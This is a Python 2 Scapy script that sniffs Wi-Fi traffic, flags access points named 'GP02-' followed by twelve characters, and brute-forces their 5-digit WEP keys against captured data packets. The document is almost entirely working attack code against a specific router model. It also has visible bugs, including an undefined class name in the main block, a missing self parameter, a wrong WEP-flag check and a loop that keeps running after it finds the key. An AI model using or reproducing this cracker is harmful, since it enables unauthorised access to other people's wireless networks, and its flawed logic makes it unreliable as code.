#!/usr/bin/env python
# -*- coding: utf-8 -*-
from scapy.all import *
from scapy.utils import *
from zlib import crc32
from Crypto.Cipher import ARC4
import re,os,sys

class WEPCrackUtil:
      """
The Python2 class for Cracking WEP Keys in off-line with Scapy
It holds VulnESSID,functions for crack them.

      Use 'iwconfig wlan0 mode monitor' or
      'airmon-ng start wlan0' to sniff all of the packets flying.
      """
      def __init__(self,DEBUG=True):
        """
      (regstr)essidRegexVuln:Func4Crack(pkt)
        """
        self.bssidMatched={}#{essid:bssid}
        self.essidRegexVuln={
          re.compile("^GP02-[a-zA-Z0-9]{12}$") : self.w5DBF
        }
        self.d=lambda s:sys.stderr.write('[DEBUG] %s %s' % (s,os.linesep) ) if DEBUG == True else lambda s:False

        self.d('Init OK')
      def sniffer(chan=0):
        if chan > 13 or chan < 1:
          self.d('Invalid Channel!')
         
      def searchDot11ESSIDinPkt(self,pkt):
        """
      if pkt[Dot11Elt] has Vuln ESSID info then Keep the AP's BSSID in self.bssidMatched and return 0
      else return -1or-2
        """
        if not Dot11 in pkt:
          #self.d("There is no MAC header in this packet")
          return -1
        if not Dot11Elt in pkt:
          #self.d("There is no Dot11Elt Packet in this packet")
          return -1
        parent=pkt
        self.d("Got IEEE802.11 Element packets!") 
        pkt=pkt[Dot11Elt]
        while pkt:
          #The Dot11Elt layer is often multiple.
          #Sometimes its not sorted due to radio noise
            if pkt.ID == 0:
                  # 0 is the ID of ESSID.
                  essid=pkt.info
                  for regkeys in self.essidRegexVuln:
                    if not regkeys.match(essid):
                      continue
                    addr=self.whichAddrIsBSSID(parent.FCfield)
                    bssid=parent.getfieldval(addr)
                    self.bssidMatched.update({essid:bssid})
                    self.d('Matched! VulnESSID "%s"' % essid)
                    return 0
                  self.d("No Match")
                  return -1
            pkt=pkt.payload# next Element
        if not pkt:
          self.d("No ESSID Element")
          return -1
      def whichAddrIsBSSID(self,fc):
        """
        we have to figure out the BSSID corresponds to the ESSID.
        returns "addr?"
        """
        ds=fc & 0x3
        if ds == 0x0:
          return "addr3"
        elif ds == 0x1:
          return "addr1"
        elif ds == 0x2:
          return "addr2"
        else:
          self.d(" WDS! Assuming addr2 as it's Transmitter..")
          return "addr2"
          #return "addr3"
          #return "addr1"
          #return "addr4"
        self.d('Is this valid FrameControl field??')
        return "" # WHAT!??
      def isValidKey(self,key,wepdatapkt):
        c=ARC4.new(wepdatapkt[Dot11WEP].iv+key)
        dataICV=c.decrypt(str(wepdatapkt)[-4-len(wepdatapkt.wepdata):])
        data=dataICV[:-4]
        icv=dataICV[-4:]
        if crc32(data) in struct.unpack('<l',icv):
          return True
        else:
          return False
      def w5DBF(self,pkt):
        """
        5digit bruteforcer
        """
        if not Dot11 in pkt:
          self.d("NOT a IEEE802.11 Packet")
          return -1
        if pkt.type & 0x40:
          self.d("NOT a WEP Packet")
          return -1
        if pkt.type != 0x2:
          self.d("NOT a DATA Packet")
          return -1
        for i in range(100000):
          if self.isValidKey('%05d' % i,pkt):
            self.d('Got a key! => %05d ' % i)
          else:
            self.d('i=%d' % i)

if __name__ == "__main__":
      my=WEPBF(DEBUG=True)
      from scapy.all import *
      def x(pkt):
        my.searchDot11ESSIDinPkt(pkt)
      sniff(iface="wlan0",lfilter=lambda pkt:Dot11 in pkt,prn=x)
      #sniff(offline="a.cap",lfilter=lambda pkt:Dot11 in pkt,prn=x)
      print my.bssidMatched
